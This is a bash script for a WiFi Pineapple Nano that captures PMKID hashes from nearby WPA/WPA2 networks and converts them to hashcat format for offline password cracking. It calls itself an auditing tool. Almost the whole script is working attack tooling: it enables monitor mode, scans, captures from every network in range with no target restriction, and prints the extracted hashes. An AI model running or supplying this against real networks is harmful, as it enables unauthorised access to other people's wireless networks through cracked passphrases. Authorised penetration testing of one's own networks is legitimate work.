#!/bin/bash
#
# PMKID Capture Tool for WiFi Pineapple Nano
# Enhanced with iNFINITEAi2025 features
# 
# This script captures PMKID hashes from WPA/WPA2 networks
# for security auditing and penetration testing purposes
#

# Color codes for better output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration variables
INTERFACE="wlan1mon"
OUTPUT_DIR="/root/pmkid_captures"
TIMEOUT=300
VERBOSE=0
CONFIG_FILE="/etc/pmkid/config.conf"

# Banner
print_banner() {
    echo -e "${BLUE}"
    echo "═══════════════════════════════════════════════════════════"
    echo "  PMKID Capture Tool - WiFi Pineapple Nano Edition"
    echo "  Enhanced by iNFINITEAi2025"
    echo "═══════════════════════════════════════════════════════════"
    echo -e "${NC}"
}

# Logging function
log() {
    local level=$1
    shift
    local message="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")
            echo -e "${GREEN}[INFO]${NC} $message"
            ;;
        "WARN")
            echo -e "${YELLOW}[WARN]${NC} $message"
            ;;
        "ERROR")
            echo -e "${RED}[ERROR]${NC} $message"
            ;;
        "DEBUG")
            if [ $VERBOSE -eq 1 ]; then
                echo -e "${BLUE}[DEBUG]${NC} $message"
            fi
            ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$OUTPUT_DIR/pmkid.log"
}

# Check for required tools
check_dependencies() {
    log "INFO" "Checking dependencies..."
    
    local required_tools=("hcxdumptool" "hcxpcapngtool" "airmon-ng" "iw")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        log "ERROR" "Missing required tools: ${missing_tools[*]}"
        log "INFO" "Install with: opkg install hcxtools aircrack-ng"
        return 1
    fi
    
    log "INFO" "All dependencies satisfied"
    return 0
}

# Check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        log "ERROR" "This script must be run as root"
        return 1
    fi
    return 0
}

# Setup interface in monitor mode
setup_monitor_mode() {
    local interface=$1
    
    log "INFO" "Setting up monitor mode on $interface..."
    
    # Kill interfering processes
    airmon-ng check kill &> /dev/null
    
    # Check if interface exists
    if ! ip link show "$interface" &> /dev/null; then
        log "WARN" "Interface $interface not found, trying wlan1..."
        interface="wlan1"
        
        if ! ip link show "$interface" &> /dev/null; then
            log "ERROR" "No suitable wireless interface found"
            return 1
        fi
    fi
    
    # Put interface down
    ip link set "$interface" down 2>/dev/null
    
    # Set monitor mode
    iw dev "$interface" set type monitor 2>/dev/null
    
    # Bring interface up
    ip link set "$interface" up 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log "INFO" "Monitor mode enabled on $interface"
        INTERFACE=$interface
        return 0
    else
        log "ERROR" "Failed to set monitor mode"
        return 1
    fi
}

# Scan for networks
scan_networks() {
    log "INFO" "Scanning for nearby networks..."
    
    timeout 10 hcxdumptool -i "$INTERFACE" --do_rcascan -o /tmp/scan_temp.pcapng 2>/dev/null
    
    if [ -f /tmp/scan_temp.pcapng ]; then
        hcxpcapngtool -o /tmp/scan_results.txt /tmp/scan_temp.pcapng 2>/dev/null
        
        if [ -f /tmp/scan_results.txt ]; then
            log "INFO" "Found networks:"
            cat /tmp/scan_results.txt | head -20
        fi
        
        rm -f /tmp/scan_temp.pcapng /tmp/scan_results.txt
    fi
}

# Capture PMKIDs
capture_pmkids() {
    local timeout=$1
    local output_file
    output_file="$OUTPUT_DIR/capture_$(date +%Y%m%d_%H%M%S).pcapng"
    
    log "INFO" "Starting PMKID capture for ${timeout}s..."
    log "INFO" "Output file: $output_file"
    
    # Create output directory if it doesn't exist
    mkdir -p "$OUTPUT_DIR"
    
    # Start capture
    timeout "$timeout" hcxdumptool -i "$INTERFACE" -o "$output_file" --enable_status=1
    
    if [ -f "$output_file" ]; then
        # Linux first (WiFi Pineapple Nano), then macOS fallback
        local file_size
        file_size=$(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null)
        
        if [ $file_size -gt 0 ]; then
            log "INFO" "Capture complete: $output_file (${file_size} bytes)"
            
            # Convert to hashcat format
            local hash_file="${output_file%.pcapng}.hc22000"
            hcxpcapngtool -o "$hash_file" "$output_file" 2>/dev/null
            
            if [ -f "$hash_file" ]; then
                local hash_count
                hash_count=$(wc -l < "$hash_file")
                log "INFO" "Extracted $hash_count PMKID hash(es) to: $hash_file"
                
                # Display captured PMKIDs
                if [ $hash_count -gt 0 ]; then
                    log "INFO" "Captured PMKIDs:"
                    cat "$hash_file"
                fi
            else
                log "WARN" "No PMKIDs found in capture"
            fi
        else
            log "WARN" "Capture file is empty"
            rm -f "$output_file"
        fi
    else
        log "ERROR" "Capture failed - no output file created"
        return 1
    fi
    
    return 0
}

# Cleanup function
cleanup() {
    log "INFO" "Cleaning up..."
    
    # Restore interface to managed mode
    if [ -n "$INTERFACE" ]; then
        ip link set "$INTERFACE" down 2>/dev/null
        iw dev "$INTERFACE" set type managed 2>/dev/null
        ip link set "$INTERFACE" up 2>/dev/null
        log "INFO" "Interface restored to managed mode"
    fi
}

# Signal handler
trap cleanup EXIT INT TERM

# Usage information
usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i INTERFACE    Wireless interface to use (default: wlan1)"
    echo "  -o OUTPUT_DIR   Output directory for captures (default: $OUTPUT_DIR)"
    echo "  -t TIMEOUT      Capture timeout in seconds (default: $TIMEOUT)"
    echo "  -s              Scan mode only (no capture)"
    echo "  -v              Verbose output"
    echo "  -h              Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -i wlan1 -t 600 -v"
    echo ""
}

# Parse command line arguments
SCAN_ONLY=0

while getopts "i:o:t:svh" opt; do
    case $opt in
        i)
            INTERFACE=$OPTARG
            ;;
        o)
            OUTPUT_DIR=$OPTARG
            ;;
        t)
            TIMEOUT=$OPTARG
            ;;
        s)
            SCAN_ONLY=1
            ;;
        v)
            VERBOSE=1
            ;;
        h)
            print_banner
            usage
            exit 0
            ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            usage
            exit 1
            ;;
    esac
done

# Main execution
main() {
    print_banner
    
    # Perform checks
    check_root || exit 1
    check_dependencies || exit 1
    
    # Setup monitor mode
    setup_monitor_mode "$INTERFACE" || exit 1
    
    if [ $SCAN_ONLY -eq 1 ]; then
        scan_networks
        exit 0
    fi
    
    # Scan for networks first
    scan_networks
    
    # Capture PMKIDs
    capture_pmkids $TIMEOUT
    
    log "INFO" "Operation complete"
    log "INFO" "Results saved to: $OUTPUT_DIR"
}

# Run main function
main
